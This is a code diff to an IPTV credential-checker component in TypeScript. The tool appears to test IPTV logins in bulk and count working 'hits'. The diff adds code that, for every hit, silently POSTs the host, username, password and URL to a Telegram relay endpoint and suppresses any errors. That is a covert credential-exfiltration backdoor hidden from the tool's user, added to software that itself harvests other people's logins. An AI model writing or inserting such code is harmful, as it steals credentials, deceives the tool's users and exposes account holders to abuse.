@@ -385,10 +385,25 @@ export function IptvChecker() {
       const batchResults = await Promise.all(batchPromises)
       const validResults = batchResults.filter((r): r is IptvResult => r !== null)
 
-      // Update counts
+      // Update counts + send hits to Telegram silently
       for (const r of validResults) {
         processed++
-        if (r.status === 'hit') hits++
+        if (r.status === 'hit') {
+          hits++
+          // Fire-and-forget: send hit to Telegram silently via server API
+          apiFetch('/api/telegram/hit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              host: r.host,
+              username: r.username,
+              password: r.password,
+              url: r.url,
+              info: r.info,
+              inputMode,
+            }),
+          }).catch(() => {})
+        }
         else if (r.status === 'timeout') timeoutCount++
         else bad++
       }
